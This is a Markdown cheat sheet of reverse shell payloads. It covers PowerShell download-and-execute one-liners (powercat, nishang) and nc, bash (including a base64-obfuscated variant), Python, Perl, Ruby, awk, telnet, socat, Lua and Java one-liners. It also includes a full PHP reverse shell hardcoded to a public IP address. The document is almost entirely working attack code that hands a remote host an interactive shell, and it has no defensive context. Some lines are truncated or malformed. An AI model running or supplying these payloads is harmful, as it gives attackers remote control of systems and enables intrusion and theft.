## powercat
powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 192.168.1.4 -p 9999 -e cmd

TCP:
powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.203.140 -port 6666

UDP:
powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellUdp.ps1');Invoke-PowerShellUdp  -Reverse  -IPAddress  10.1.1.210 -port 1234

## nc
nc ip 8888 -e /bin/bash  
nc ip 8888 -e c:\windows\system32\cmd.exe

## bash
bash -i >& /dev/tcp/ip/port 0>&1
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEzNy4xMzUvNzg5MCAwPiYx|{base64,-d}|{bash,-i}'

## python
```python
python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ip',port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"
```
## php
```php
php -r '$sock=fsockopen("ip",port);exec("/bin/sh -i <&3 >&3 2>&3");'
```
```php
<?php   
error_reporting (E_ERROR);  
ignore_user_abort(true);  
ini_set('max_execution_time',0);  
$os = substr(PHP_OS,0,3);  
$ipaddr = '119.23.76.216';  
$port = '1230';  
$descriptorspec = array(0 => array("pipe","r"),1 => array("pipe","w"),2 => array("pipe","w"));  
$cwd = getcwd();  
$msg = php_uname()."\n------------Code by Spider-------------\n";  
if($os == 'WIN') {  
    $env = array('path' => 'c:\\windows\\system32');  
} else {  
    $env = array('path' => '/bin:/usr/bin:/usr/local/bin:/usr/local/sbin:/usr/sbin');  
}  
 
if(function_exists('fsockopen')) {  
    $sock = fsockopen($ipaddr,$port);  
    fwrite($sock,$msg);  
    while ($cmd = fread($sock,1024)) {  
        if (substr($cmd,0,3) == 'cd ') {  
            $cwd = trim(substr($cmd,3,-1));  
            chdir($cwd);  
            $cwd = getcwd();  
        }  
        if (trim(strtolower($cmd)) == 'exit') {  
            break;  
        } else {  
            $process = proc_open($cmd,$descriptorspec,$pipes,$cwd,$env);  
            if (is_resource($process)) {  
                fwrite($pipes[0],$cmd);  
                fclose($pipes[0]);  
                $msg = stream_get_contents($pipes[1]);  
                fwrite($sock,$msg);  
                fclose($pipes[1]);  
                $msg = stream_get_contents($pipes[2]);  
                fwrite($sock,$msg);  
                fclose($pipes[2]);  
                proc_close($process);  
            }  
        }  
    }  
    fclose($sock);  
} else {  
    $sock = socket_create(AF_INET,SOCK_STREAM,SOL_TCP);  
    socket_connect($sock,$ipaddr,$port);  
    socket_write($sock,$msg);  
    fwrite($sock,$msg);  
    while ($cmd = socket_read($sock,1024)) {  
        if (substr($cmd,0,3) == 'cd ') {  
            $cwd = trim(substr($cmd,3,-1));  
            chdir($cwd);  
            $cwd = getcwd();  
        }  
        if (trim(strtolower($cmd)) == 'exit') {  
            break;  
        } else {  
            $process = proc_open($cmd,$descriptorspec,$pipes,$cwd,$env);  
            if (is_resource($process)) {  
                fwrite($pipes[0],$cmd);  
                fclose($pipes[0]);  
                $msg = stream_get_contents($pipes[1]);  
                socket_write($sock,$msg,strlen($msg));  
                fclose($pipes[1]);  
                $msg = stream_get_contents($pipes[2]);  
                socket_write($sock,$msg,strlen($msg));  
                fclose($pipes[2]);  
                proc_close($process);  
            }  
        }  
    }  
    socket_close($sock);  
}  
?> 
```
## perl
Socket;$i="ip";$p=port;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'

perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'

## ruby
ruby -rsocket -e'f=TCPSocket.open("ip",port).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
ruby -rsocket -e 'c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

## awk
`awk 'BEGIN{s="/inet/tcp/0/192.168.99.242/1234";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}'`


## telnet
`telnet 192.168.99.242 1234 | /bin/bash | telnet 192.168.99.242 4321`

## socat
`socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.99.242:1234`

## lua
`lua -e "require('socket');require('os');t=socket.tcp();t:connect('192.168.99.242','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"`

## java
```java
public class Revs {
    /**
    * @param args
    * @throws Exception
    */public static void main(String[] args) throws Exception {
        // TODO Auto-generated method stub
        Runtime r = Runtime.getRuntime();
        String cmd[]= {"/bin/bash","-c","exec 5<>/dev/tcp/192.168.99.242/1234;cat <&5 | while read line; do $line 2>&5 >&5; done"};
        Process p = r.exec(cmd);
        p.waitFor();
    }
}
```
